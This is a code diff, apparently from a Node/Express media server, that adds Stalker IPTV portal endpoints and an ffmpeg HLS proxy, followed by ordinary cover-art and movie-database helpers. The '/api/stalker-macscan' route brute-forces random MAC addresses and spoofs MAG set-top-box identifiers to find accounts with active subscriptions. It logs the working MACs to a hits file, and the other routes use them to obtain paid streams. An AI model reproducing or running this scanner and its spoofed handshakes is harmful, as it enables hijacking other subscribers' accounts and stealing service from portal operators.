+          }).catch(() => null);
+        }
+      }
+    } catch (e) {
+      console.log(`[STALKER-HLS] Handshake failed: ${e.message}`);
+    }
+  }
+  if (!token) return res.status(502).json({ error: 'Handshake failed — no token' });
+
+  // 2) create_link — GAP FIX: skip if not needed (direct URL streams)
+  const type = (linkType || 'itv').toLowerCase();
+  let cmdStr = cmd.replace(/^ffmpeg\s+/i, '');
+  const cookieWithToken = cookieBase + (token ? `; token=${token}` : '');
+  let streamUrl = '';
+
+  // MacAttack only calls create_link when cmd contains /ch/ or ffrt (portal-resolved URLs)
+  // Direct http(s):// streams don't need it — skip to save a round trip
+  const needsCreateLink = cmdStr.includes('/ch/') || cmdStr.includes('ffrt') || !/^https?:\/\//i.test(cmdStr);
+  if (!needsCreateLink) {
+    streamUrl = cmdStr;
+    console.log(`[STALKER-HLS] Direct URL — skipping create_link`);
+  } else {
+    try {
+      const seriesParam = type === 'vod' && req.query.series ? `&series=${encodeURIComponent(req.query.series)}` : '';
+      const clRes = await fetch(`${base}?type=${type}&action=create_link&cmd=${encodeURIComponent(cmdStr)}${seriesParam}&JsHttpRequest=1-xml`, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+          'Accept': '*/*', 'Accept-Encoding': 'identity', 'Cookie': cookieWithToken,
+          'Authorization': `Bearer ${token}`, 'Connection': 'keep-alive',
+          ...(tokenRandom ? { 'X-Random': String(tokenRandom) } : {}),
+        },
+        signal: AbortSignal.timeout(10000),
+      });
+      if (clRes.ok) {
+        const clData = await clRes.json();
+        streamUrl = (clData?.js?.cmd || '').replace(/^ffmpeg\s+/i, '');
+      }
+    } catch (e) {
+      console.log(`[STALKER-HLS] create_link failed: ${e.message}`);
+    }
+  }
+  if (!streamUrl) return res.status(502).json({ error: 'create_link failed — no stream URL' });
+  console.log(`[STALKER-HLS] Resolved: ${streamUrl.substring(0, 80)}...`);
+
+  // 3) Mode: remux (copy) by default — near-zero CPU. Client can request transcode via ?mode=transcode
+  let mode = (req.query.mode || 'remux').toLowerCase();
+  console.log(`[STALKER-HLS] Mode: ${mode}${mode === 'transcode' ? ' (full re-encode)' : ' (copy/stream)'}`);
+
+  // 3b) ffmpeg transcode to HLS
+  const sessionId = crypto.randomBytes(8).toString('hex');
+  const tmpDir = path.join(os.tmpdir(), `cinevault-tc-${sessionId}`);
+  fs.mkdirSync(tmpDir, { recursive: true });
+
+  const bitrate = req.query.bitrate || '2500k';
+  const abitrate = req.query.abitrate || '128k';
+  // mode is set above by probe (auto/remux/transcode)
+
+  // Build ffmpeg input: fetch from CDN with MAG200 cookies
+  const ffmpegArgs = [
+    '-timeout', '10000000',             // 10s connect timeout (nanoseconds for ffmpeg)
+    '-reconnect', '1',                  // reconnect on network error
+    '-reconnect_streamed', '1',
+    '-reconnect_delay_max', '10',        // max 10s between reconnect attempts
+    '-reconnect_on_network_error', '1',
+    '-fflags', '+genpts+discardcorrupt+igndts',  // handle corrupt/PTS streams
+    '-max_delay', '500000',             // 500ms max mux delay — don't let ffmpeg internally buffer
+    '-analyzeduration', '1500000',      // 1.5s analyze — match backup, less misdetect
+    '-probesize', '1000000',            // 1MB probe — match backup
+    '-user_agent', 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+    '-headers', 'Cookie: ' + cookieWithToken + '\r\nAuthorization: Bearer ' + token + '\r\n' + (tokenRandom ? 'X-Random: ' + tokenRandom + '\r\n' : '') + 'Referer: ' + (portalUrl || '') + '\r\nConnection: keep-alive\r\n',
+    '-i', streamUrl,
+  ];
+
+  if (mode === 'transcode') {
+    // Full re-encode — heavy CPU, use only when codec isn't browser-compatible
+    ffmpegArgs.push(
+      '-c:v', 'libx264',
+      '-preset', 'ultrafast',
+      '-tune', 'zerolatency',
+      '-pix_fmt', 'yuv420p',
+      '-b:v', bitrate,
+      '-maxrate', bitrate,
+      '-bufsize', `${parseInt(bitrate) * 2}k`,
+      '-g', '60',                         // keyframe every 60 frames (2s at 30fps)
+      '-keyint_min', '60',               // force keyframe interval
+      '-force_key_frames', 'expr:gte(t,n_forced*2)',  // keyframe every 2s for clean HLS segments
+      '-c:a', 'aac',
+      '-ac', '2',
+      '-ar', '48000',
+      '-b:a', abitrate,
+    );
+  } else {
+    // REMUX — just copy codecs, near-zero CPU, 10-100x faster than transcode
+    // NOTE: with -c:v copy, ffmpeg can't force keyframes, so -hls_time is just a hint.
+    // Segments will be cut at actual keyframe boundaries (could be 4-10s each).
+    ffmpegArgs.push(
+      '-c:v', 'copy',
+      '-vsync', '1',
+      '-c:a', 'aac',
+      '-ac', '2',
+      '-ar', '48000',
+      '-af', 'aresample=async=1',
+    );
+  }
+
+  // ── Stable HLS: 6s segments for remux (ffmpeg copies keyframe intervals), 10 = 60s window ──
+  // In remux mode ffmpeg can't force keyframes, so 2s hint creates unpredictable 2-10s segments.
+  // 6s matches actual keyframe intervals and gives HLS.js enough runway to recover from lag.
+  const hlsTime = mode === 'transcode' ? '2' : '6';
+  ffmpegArgs.push(
+    '-f', 'hls',
+    '-hls_time', hlsTime,
+    '-hls_list_size', '10',           // 10 segments — 20s (transcode) or 60s (remux) window
+    '-hls_delete_threshold', '5',
+    '-hls_flags', 'delete_segments+append_list+omit_endlist+independent_segments',
+    '-hls_segment_type', 'mpegts',
+    '-start_number', '0',
+    '-hls_segment_filename', path.join(tmpDir, 'seg_%03d.ts'),
+    '-master_pl_name', 'master.m3u8',
+    path.join(tmpDir, 'index.m3u8'),
+  );
+
+  console.log(`[STALKER-HLS] Session ${sessionId}: ${mode === 'transcode' ? 'transcoding' : 'remuxing'} ${streamUrl.substring(0, 60)}...`);
+  const ffmpeg = spawn('ffmpeg', ffmpegArgs, { stdio: ['pipe', 'pipe', 'pipe'] });
+  activeTranscodes.set(sessionId, { process: ffmpeg, tmpDir, url: streamUrl, lastAccess: Date.now() });
+
+  // ── Register in shared session pool so other devices can reuse this ffmpeg ──
+  sharedStalkerSessions.set(poolKey, {
+    sessionId,
+    refCount: 1,
+    clients: new Set([clientIp]),
+    lastAccess: Date.now(),
+  });
+  console.log(`[STALKER-HLS-POOL] New session ${sessionId} registered for pool key ${poolKey.substring(0,60)} (client=${clientIp})`);
+
+  // Wait for playlist to be ready
+  const playlistPath = path.join(tmpDir, 'index.m3u8');
+  let servedPlaylist = false;
+  const serveStalkerPlaylist = () => {
+    if (res.headersSent) return true;
+    if (!fs.existsSync(playlistPath) || fs.statSync(playlistPath).size <= 0) return false;
+    console.log(`[STALKER-HLS] ${sessionId}: Playlist ready, serving`);
+
+    const masterPath = path.join(tmpDir, 'master.m3u8');
+    const servePath = fs.existsSync(masterPath) ? masterPath : playlistPath;
+    let content = fs.readFileSync(servePath, 'utf8');
+    content = content.replace(/(seg_\d+\.ts|index\.m3u8)/g, `/api/transcode/${sessionId}/$1`);
+
+    servedPlaylist = true;
+    res.writeHead(200, {
+      'Content-Type': 'application/vnd.apple.mpegurl',
+      'Access-Control-Allow-Origin': getAllowedOrigin(req),
+      'Cache-Control': 'no-cache',
+      'X-Transcode-Session': sessionId,
+      'X-Stream-Url': streamUrl.substring(0, 100),
+      'Vary': 'Origin',
+    });
+    res.end(content);
+    return true;
+  };
+  let attempts = 0;
+  const waitForPlaylist = setInterval(() => {
+    attempts++;
+    if (serveStalkerPlaylist()) {
+      clearInterval(waitForPlaylist);
+    } else if (attempts > 60) { // 30 seconds timeout (longer for CDN fetch)
+      clearInterval(waitForPlaylist);
+      console.error(`[STALKER-HLS] ${sessionId}: Timeout waiting for playlist`);
+      if (!res.headersSent) res.status(504).json({ error: 'Transcode timeout — CDN may be refusing the stream' });
+      cleanupTranscode(sessionId);
+    }
+  }, 500);
+
+  // Log ffmpeg stderr
+  let ffmpegLog = '';
+  let segmentCount = 0;
+  let lastLogTime = Date.now();
+  ffmpeg.stderr.on('data', (d) => {
+    const line = d.toString();
+    ffmpegLog += line;
+    if (line.includes('error') || line.includes('Error') || line.includes('403') || line.includes('404') || line.includes('503')) {
+      console.error(`[STALKER-HLS] ${sessionId} ffmpeg: ${line.trim()}`);
+    }
+    // Track segment generation progress
+    if (line.includes('segment:')) segmentCount++;
+    // Log progress every 5 seconds
+    if (Date.now() - lastLogTime > 5000) {
+      console.log(`[STALKER-HLS] ${sessionId} progress: ${segmentCount} segments written`);
+      lastLogTime = Date.now();
+    }
+  });
+
+  ffmpeg.on('error', (err) => {
+    console.error(`[STALKER-HLS] ${sessionId} spawn error: ${err.message}`);
+    if (!res.headersSent) res.status(500).json({ error: 'Failed to start ffmpeg', detail: err.message });
+    cleanupTranscode(sessionId);
+  });
+
+  ffmpeg.on('close', (code) => {
+    console.log(`[STALKER-HLS] ${sessionId}: ffmpeg exited with code ${code}`);
+    clearInterval(waitForPlaylist);
+    // Clean up pool entry since ffmpeg is dead
+    sharedStalkerSessions.delete(poolKey);
+    if (!res.headersSent && serveStalkerPlaylist()) return;
+    setTimeout(() => {
+      if (!res.headersSent && serveStalkerPlaylist()) return;
+      if (!res.headersSent && code !== 0) {
+        res.status(502).json({ error: 'Transcode failed', detail: ffmpegLog.slice(-1500) });
+      }
+      setTimeout(() => cleanupTranscode(sessionId), 15 * 60 * 1000);
+    }, 900);
+  });
+
+  req.on('close', () => {
+    console.log(`[STALKER-HLS] ${sessionId}: Client request closed (servedPlaylist=${servedPlaylist})`);
+    // Update shared pool refcount
+    const poolEntry = sharedStalkerSessions.get(poolKey);
+    if (poolEntry) {
+      poolEntry.refCount = Math.max(0, poolEntry.refCount - 1);
+      poolEntry.clients.delete(clientIp);
+      console.log(`[STALKER-HLS-POOL] First client disconnected from ${sessionId} (refCount=${poolEntry.refCount})`);
+    }
+    if (servedPlaylist) {
+      // ffmpeg keeps running for other devices sharing this session
+      // If no more viewers, schedule cleanup after 30s grace
+      if (poolEntry && poolEntry.refCount <= 0) {
+        setTimeout(() => {
+          const entry = sharedStalkerSessions.get(poolKey);
+          if (entry && entry.refCount <= 0) {
+            console.log(`[STALKER-HLS-POOL] No more viewers for ${entry.sessionId} — cleaning up`);
+            cleanupTranscode(entry.sessionId);
+            sharedStalkerSessions.delete(poolKey);
+          }
+        }, 30000);
+      }
+      return;
+    }
+    console.log(`[STALKER-HLS] ${sessionId}: Client disconnected before playlist served, killing ffmpeg`);
+    ffmpeg.kill('SIGKILL');
+    clearInterval(waitForPlaylist);
+    cleanupTranscode(sessionId);
+    sharedStalkerSessions.delete(poolKey);
+  });
+});
+
+// ── Stalker MAC Scanner (headless BigMacAttack) ──
+// Brute-forces MACs with 00:1A:79: prefix until finding one with active subscription
+// Returns hit info including channel count and expiry when found
+app.get('/api/stalker-macscan', async (req, res) => {
+  const { url: portalUrl, prefix, count, proxy } = req.query;
+  if (!portalUrl) return res.status(400).json({ error: 'Missing url param' });
+  if (!isUrlAllowed(portalUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  const macPrefix = (prefix || '00:1A:79').toUpperCase();
+  const maxAttempts = Math.min(parseInt(count) || 50, 200);
+  const proxyUrl = proxy || null;
+
+  const base = resolveStalkerPortal(portalUrl).apiUrl;
+  const results = [];
+
+  // Set up SSE for progress
+  res.setHeader('Content-Type', 'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection', 'keep-alive');
+
+  const sendEvent = (data) => {
+    if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`);
+  };
+
+  const tryMac = async (mac) => {
+    const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+    const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+    const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+    const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+
+    const cookieStr = [
+      `adid=${hwVersion}`, 'debug=1', `device_id2=${deviceId2}`, `device_id=${deviceId}`,
+      'hw_version=1.7-BD-00', `mac=${mac}`, `sn=${serialNum}`, 'stb_lang=en', 'timezone=America/Los_Angeles'
+    ].join('; ');
+
+    const headers = {
+      'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+      'Accept-Encoding': 'identity',
+      'Accept': '*/*',
+      'Connection': 'keep-alive',
+      'Cookie': cookieStr
+    };
+
+    const fetchOpts = { headers, timeout: 12000 };
+    if (proxyUrl) { fetchOpts.proxy = proxyUrl; }
+
+    try {
+      // Step 1: Handshake
+      const hsRes = await fetchWithTimeout(`${base}?action=handshake&type=stb&JsHttpRequest=1-xml`, fetchOpts);
+      if (!hsRes.ok) return null;
+      const hsData = await hsRes.json();
+      const token = hsData?.js?.token;
+      if (!token) return null;
+
+      // Update headers with Bearer token
+      headers['Authorization'] = `Bearer ${token}`;
+      const tokenRandom = hsData?.js?.random || 0;
+
+      // Step 2: Get profile (activates the portal)
+      const sig = tokenRandom
+        ? crypto.createHash('sha256').update(String(tokenRandom)).digest('hex').toUpperCase()
+        : crypto.createHash('sha256').update(serialNum + mac).digest('hex').toUpperCase();
+
+      const profileUrl = `${base}?type=stb&action=get_profile&hd=1&ver=ImageDescription:0.2.18-r23-250&sn=${serialNum}&stb_type=MAG250&client_type=STB&device_id=${deviceId2}&device_id2=${deviceId2}&sig=${sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&timestamp=${Math.round(Date.now()/1000)}&api_sig=262&prehash=0&JsHttpRequest=1-xml`;
+      await fetchWithTimeout(profileUrl, fetchOpts).catch(() => {});
+
+      // Step 3: Account info — check subscription
+      const acctRes = await fetchWithTimeout(`${base}?type=account_info&action=get_main_info&JsHttpRequest=1-xml`, fetchOpts);
+      let expiry = null;
+      let active = false;
+      if (acctRes.ok) {
+        const acctData = await acctRes.json();
+        const js = acctData?.js || {};
+        const phone = js.phone || '';
+        const tariffPlanId = js.tariff_plan_id || js.tariff_plan_id_with_mod_period || 0;
+        const verified = js.verified || 0;
+        // MacAttack logic: tariff_plan_id > 0 means active sub
+        if (tariffPlanId > 0 || verified > 0 || (phone && phone !== '')) {
+          active = true;
+          if (phone) {
+            try {
+              const ts = parseInt(phone);
+              if (!isNaN(ts) && ts > 1000000000) expiry = new Date(ts * 1000).toISOString().split('T')[0];
+              else expiry = phone;
+            } catch { expiry = phone; }
+          }
+        }
+      }
+
+      // Step 4: Get channel count
+      const chRes = await fetchWithTimeout(`${base}?type=itv&action=get_all_channels&JsHttpRequest=1-xml`, fetchOpts);
+      let channelCount = 0;
+      if (chRes.ok) {
+        const chData = await chRes.json();
+        channelCount = chData?.js?.data?.length || 0;
+      }
+
+      // Step 5: Test create_link if channel count > 0
+      let streamWorks = false;
+      let streamDomain = null;
+      if (channelCount > 0) {
+        const clRes = await fetchWithTimeout(`${base}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml`, fetchOpts);
+        if (clRes.ok) {
+          const clData = await clRes.json();
+          const cmd = clData?.js?.cmd;
+          if (cmd) {
+            try {
+              const parsed = new URL(cmd.replace('ffmpeg ', '').trim());
+              streamDomain = parsed.hostname;
+              // Quick HEAD check on CDN
+              const cdnCheck = await fetchWithTimeout(cmd.replace('ffmpeg ', '').trim(), { ...fetchOpts, method: 'HEAD', timeout: 5000 }).catch(() => null);
+              if (cdnCheck && cdnCheck.ok) streamWorks = true;
+            } catch {}
+          }
+        }
+      }
+
+      return { mac, token, active, expiry, channelCount, streamWorks, streamDomain };
+    } catch (e) {
+      return null;
+    }
+  };
+
+  // Helper: fetch with timeout
+  function fetchWithTimeout(url, opts = {}) {
+    const timeout = opts.timeout || 12000;
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), timeout);
+    const { timeout: _, ...fetchOptions } = opts;
+    fetchOptions.signal = controller.signal;
+    return fetch(url, fetchOptions).then(r => { clearTimeout(timer); return r; }).catch(e => { clearTimeout(timer); throw e; });
+  }
+
+  // Generate random MACs
+  const generateMac = () => {
+    const p = macPrefix.endsWith(':') ? macPrefix : macPrefix + ':';
+    const hex = () => Math.floor(Math.random() * 256).toString(16).toUpperCase().padStart(2, '0');
+    return `${p}${hex()}:${hex()}:${hex()}`;
+  };
+
+  let hits = 0;
+  for (let i = 0; i < maxAttempts; i++) {
+    const mac = generateMac();
+    sendEvent({ type: 'progress', attempt: i + 1, max: maxAttempts, mac });
+
+    const result = await tryMac(mac);
+    if (result && result.channelCount > 0) {
+      hits++;
+      sendEvent({ type: 'hit', ...result });
+      results.push(result);
+
+      // If stream actually works, we're done — save it as default
+      if (result.streamWorks) {
+        // Save to portal-hits.json
+        try {
+          const hitsFile = path.join(__dirname, 'data', 'portal-hits.json');
+          let existing = [];
+          if (fs.existsSync(hitsFile)) existing = JSON.parse(fs.readFileSync(hitsFile, 'utf8'));
+          const hitEntry = {
+            url: portalUrl,
+            mac: result.mac,
+            channelCount: result.channelCount,
+            expiry: result.expiry,
+            streamWorks: result.streamWorks,
+            streamDomain: result.streamDomain,
+            foundAt: new Date().toISOString(),
+            source: 'macscan'
+          };
+          // Avoid duplicate MACs
+          if (!existing.find(h => h.mac === result.mac)) existing.push(hitEntry);
+          fs.writeFileSync(hitsFile, JSON.stringify(existing, null, 2));
+        } catch {}
+
+        sendEvent({ type: 'done', hits, results, message: `STREAM WORKS! MAC ${result.mac} has active subscription, ${result.channelCount} channels, expires ${result.expiry || 'unknown'}` });
+        res.end();
+        return;
+      }
+    }
+  }
+
+  sendEvent({ type: 'done', hits, results, message: hits > 0 ? `Found ${hits} MACs with channels but streams blocked (expired subs). Try more attempts or different portal.` : `No hits after ${maxAttempts} attempts. Try different portal or more attempts.` });
+  res.end();
+});
+
+// ── Stalker Create Link (resolve localhost stream URLs to real URLs) ──
+app.get('/api/stalker-create-link', async (req, res) => {
+  const { url: portalUrl, mac, cmd, token: oldToken, proxy: proxyType } = req.query;
+  if (!portalUrl || !mac || !cmd) return res.status(400).json({ error: 'Missing url, mac, or cmd param' });
+  if (!isUrlAllowed(portalUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+
+  const base = resolveStalkerPortal(portalUrl).apiUrl;
+
+  // MacAttack: always do fresh handshake before create_link (token expires in 10s!)
+  let token = oldToken || '';
+  let tokenRandom = '';
+  try {
+    const hsUrl = `${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;
+    const cookieStr = [
+      `adid=${hwVersion}`, 'debug=1', `device_id2=${deviceId2}`, `device_id=${deviceId}`,
+      'hw_version=1.7-BD-00', `mac=${mac}`, `sn=${serialNum}`, 'stb_lang=en', 'timezone=America/Los_Angeles',
+    ].filter(Boolean).join('; ');
+    const hsRes = await fetch(hsUrl, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+        'Accept': '*/*', 'Accept-Encoding': 'identity', 'Cookie': cookieStr,
+      },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (hsRes.ok) {
+      const hsData = await hsRes.json();
+      const freshToken = hsData?.js?.token;
+      const freshRandom = hsData?.js?.random || '';
+      if (freshToken) {
+        token = freshToken;
+        tokenRandom = freshRandom;
+        console.log(`[STALKER-CREATE-LINK] Fresh handshake token: ${token.substring(0, 16)}...`);
+
+        // GAP FIX: get_profile with auth_second_step — many portals require this
+        // to activate the subscription before create_link will work
+        try {
+          const cookieWithTok = cookieStr + `; token=${token}`;
+          const sig = freshRandom
+            ? crypto.createHash('sha256').update(String(freshRandom)).digest('hex').toUpperCase()
+            : '';
+          const metrics = JSON.stringify({ mac, sn: serialNum, type: 'STB', model: 'MAG250', uid: deviceId2, random: freshRandom || 0 });
+          const profileUrl = `${base}?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A%200.2.18-r23-250%3B%20PORTAL%20version%3A%205.3.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20343%3B%20STB%20API%20version%3A%20146&num_banks=2&sn=${serialNum}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id=${deviceId2}&device_id2=${deviceId2}&sig=${sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=${encodeURIComponent(metrics)}&hw_version_2=${hwVersion}&timestamp=${Math.round(Date.now()/1000)}&api_sig=262&prehash=0&JsHttpRequest=1-xml`;
+          await fetch(profileUrl, {
+            headers: {
+              'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+              'Accept': '*/*',
+              'Accept-Encoding': 'identity',
+              'Cookie': cookieWithTok,
+              'Authorization': `Bearer ${token}`,
+              ...(freshRandom ? { 'X-Random': String(freshRandom) } : {}),
+            },
+            signal: AbortSignal.timeout(5000),
+          }).catch(() => null);
+          console.log(`[STALKER-CREATE-LINK] get_profile + auth_second_step sent`);
+        } catch (profileErr) {
+          console.log(`[STALKER-CREATE-LINK] get_profile failed: ${profileErr.message}`);
+        }
+      }
+    }
+  } catch (e) {
+    console.log(`[STALKER-CREATE-LINK] Handshake refresh failed, using old token: ${e.message}`);
+  }
+
+  // MacAttack: cmd_encoded = quote(cmd) — just URL-encode the raw cmd, no prefix
+  // Detect stream type: VOD movies use type=vod, live TV uses type=itv
+  const linkType = (req.query.linkType || 'itv').toLowerCase();
+  let cmdStr = cmd;
+  cmdStr = cmdStr.replace(/^ffmpeg\s+/i, '');
+  const linkUrl = `${base}?type=${linkType}&action=create_link&cmd=${encodeURIComponent(cmdStr)}${linkType === 'vod' && req.query.series ? '&series=' + encodeURIComponent(req.query.series) : ''}&JsHttpRequest=1-xml`;
+
+  // Full MacAttack cookie set for create_link (10 cookies including token + random)
+  const cookieStr = [
+    `adid=${hwVersion}`,
+    'debug=1',
+    `device_id2=${deviceId2}`,
+    `device_id=${deviceId}`,
+    'hw_version=1.7-BD-00',
+    `mac=${mac}`,
+    `sn=${serialNum}`,
+    'stb_lang=en',
+    'timezone=America/Los_Angeles',
+    token ? `token=${token}` : '',
+  ].filter(Boolean).join('; ');
+
+  try {
+    const upstream = await fetch(linkUrl, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+        'Accept': '*/*',
+        'Accept-Encoding': 'identity',
+        'Cookie': cookieStr,
+        ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+        ...(tokenRandom ? { 'X-Random': String(tokenRandom) } : {}),
+      },
+      signal: AbortSignal.timeout(10000),
+    });
+
+    if (upstream.ok) {
+      const data = await upstream.json();
+      let streamUrl = data?.js?.cmd || '';
+      streamUrl = streamUrl.replace(/^ffmpeg\s+/i, '');
+      res.json({ streamUrl, token, raw: data });
+    } else {
+      res.status(502).json({ error: 'create_link failed', status: upstream.status });
+    }
+  } catch (err) {
+    res.status(502).json({ error: 'create_link error', detail: 'Request failed' });
+  }
+});
+
+app.get('/api/stalker-handshake', async (req, res) => {
+  const { url: portalUrl, mac } = req.query;
+  if (!portalUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!mac) return res.status(400).json({ error: 'Missing ?mac= parameter' });
+  if (!isUrlAllowed(portalUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+  const base = resolveStalkerPortal(portalUrl).apiUrl;
+  const cookieStr = [
+    `adid=${hwVersion}`,
+    'debug=1',
+    `device_id2=${deviceId2}`,
+    `device_id=${deviceId}`,
+    'hw_version=1.7-BD-00',
+    `mac=${mac}`,
+    `sn=${serialNum}`,
+    'stb_lang=en',
+    'timezone=America/Los_Angeles',
+  ].join('; ');
+
+  try {
+    const hsUrl = `${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;
+    const upstream = await fetch(hsUrl, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+        'Accept': '*/*',
+        'Accept-Encoding': 'identity',
+        'Cookie': cookieStr,
+      },
+      signal: AbortSignal.timeout(10000),
+    });
+    const data = await upstream.json();
+    return res.status(upstream.ok ? 200 : 502).json({
+      ok: !!data?.js?.token,
+      token: data?.js?.token || '',
+      portal: base,
+      style: resolveStalkerPortal(portalUrl).style,
+      raw: data,
+    });
+  } catch (err) {
+    return res.status(502).json({ ok: false, error: 'Handshake failed', detail: err.message });
+  }
+});
+
+// ── Cover Art Memory Bank ──
+// Persistent JSON file storing all found cover art URLs so we never re-fetch
+const COVER_BANK_FILE = path.join(__dirname, 'data', 'cover_bank.json');
+const TITLE_MAP_FILE = path.join(__dirname, 'data', 'title_map.json');
+const MOVIE_DB_FILE = path.join(__dirname, 'data', 'movie_db.json');
+
+let _coverBankCache = null;
+let _coverBankAllJson = null; // pre-serialized for ?all=1
+
+function readCoverBank() {
+  if (_coverBankCache) return _coverBankCache;
+  try { _coverBankCache = JSON.parse(fs.readFileSync(COVER_BANK_FILE, 'utf8')); }
+  catch { _coverBankCache = {}; }
+  return _coverBankCache;
+}
+
+function writeCoverBank(bank) {
+  ensureDataDir();
+  _coverBankCache = bank;
+  _coverBankAllJson = null; // invalidate pre-serialized cache
+  try {
+    fs.writeFileSync(COVER_BANK_FILE, JSON.stringify(bank, null, 2), 'utf8');
+  } catch (err) {
+    console.warn(`cover bank write skipped: ${err.message}`);
+  }
+  try {
+    buildMovieDb();
+  } catch (err) {
+    console.warn(`movie db rebuild skipped: ${err.message}`);
+  }
+}
+
+function readTitleMap() {
+  try {
+    return JSON.parse(fs.readFileSync(TITLE_MAP_FILE, 'utf8'));
+  } catch {
+    return {};
+  }
+}
+
+function buildMovieDb() {
+  const bank = readCoverBank();
+  const titleMap = readTitleMap();
+  const entries = [];
+  const add = (item) => {
+    if (!item || !item.title) return;
+    entries.push(item);
+  };
+
+  for (const [key, entry] of Object.entries(bank)) {
+    const title = String(entry.title || '').trim();
+    if (!title) continue;
+    const tmdbId = entry.tmdbId || entry.id || (String(key).startsWith('tmdb_') ? String(key).slice(5) : key);
+    add({
+      key,
+      tmdbId,
+      imdbId: entry.imdbId || entry.imdb || null,
+      title,
+      year: entry.year || entry.releaseDate || '',
+      type: entry.type || 'movie',
+      poster: entry.poster || entry.dvdCover || null,
+      backdrop: entry.backdrop || null,
+      source: entry.source || 'cover-bank',
+      aliases: Array.from(new Set([
+        ...movieDbAliasVariants(title),
+        ...(Array.isArray(entry.aliases) ? entry.aliases.map(normalizeSearchText) : []),
+      ].filter(Boolean))),
+    });
+  }
+
+  for (const [id, title] of Object.entries(titleMap)) {
+    const existing = entries.find(e => String(e.tmdbId) === String(id) || normalizeSearchText(e.title) === normalizeSearchText(title));
+    if (existing) {
+      if (!existing.aliases.includes(title)) existing.aliases.push(title);
+      continue;
+    }
+    add({
+      key: `title_${id}`,
+      tmdbId: id,
+      imdbId: null,
+      title,
+      year: '',
+      type: 'movie',
+      poster: null,
+      backdrop: null,
+      source: 'title-map',
+      aliases: movieDbAliasVariants(title),
+    });
+  }
+
+  try {
+    fs.writeFileSync(MOVIE_DB_FILE, JSON.stringify({ updatedAt: new Date().toISOString(), count: entries.length, entries }, null, 2), 'utf8');
+  } catch (err) {
+    console.warn(`movie db write skipped: ${err.message}`);
+  }
+
+  return entries;
+}
+
+function readMovieDb() {
+  try {
+    const data = JSON.parse(fs.readFileSync(MOVIE_DB_FILE, 'utf8'));
+    if (Array.isArray(data.entries)) return data.entries;
+  } catch {}
+  return buildMovieDb();
+}
+
+function normalizeMovieDbText(value) {
+  return normalizeSearchText(value).replace(/\b(is|the|a|an|of|and|to)\b/g, ' ').replace(/\s+/g, ' ').trim();
+}
+
+function movieDbTokenize(value) {
+  return normalizeMovieDbText(value)
+    .split(/\s+/)
+    .filter(Boolean);
+}
+
+function movieDbAliasVariants(title) {
+  const raw = String(title || '').trim();
+  if (!raw) return [];
+  const tokens = movieDbTokenize(raw);
+  const compact = tokens.join('');
+  const sorted = tokens.slice().sort().join(' ');
+  const initials = tokens.map(t => t[0]).join('');
+  const noPunct = normalizeSearchText(raw);
+  const noStop = tokens.join(' ');
+  const variants = [
+    raw,
+    noPunct,
+    noStop,
+    compact,
+    sorted,
+    initials,
+    raw.replace(/[:'’&()-]/g, ' '),
+    raw.replace(/\bpart\b/gi, 'pt'),
+    raw.replace(/\bvolume\b/gi, 'vol'),
+  ];
+  return Array.from(new Set(variants.map(v => normalizeSearchText(v)).filter(Boolean)));
+}
+
+function movieDbSearchScore(query, entry) {
+  const q = normalizeMovieDbText(query);
+  const title = normalizeMovieDbText(entry?.title);
+  if (!q || !title) return 0;
+  if (title === q) return 1000;
